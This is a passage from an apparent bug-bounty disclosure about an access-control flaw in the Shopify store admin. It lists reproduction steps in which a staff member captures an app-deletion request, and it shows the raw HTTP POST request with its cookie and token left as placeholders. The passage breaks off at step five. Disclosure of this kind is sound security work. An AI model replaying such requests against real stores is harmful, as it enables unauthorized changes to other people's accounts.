Add a staff member with full access .\n3. Now Login from staff member and go to app section from his account.You will see that he is not able to access private Apps yet.\n4. Now Try to delete the normal App and Capture the request.The request will look like the following request : \n\nVulnerable HTTP request : \n\nPOST /admin/apps/[App_ID]HTTP/1.1\nHost: [your_store].myshopify.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://vijaygangani1110store.myshopify.com/admin/apps\nCookie: [Cookie]\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 132\n\n_method=delete&authenticity_token=[Token]\n\n5.
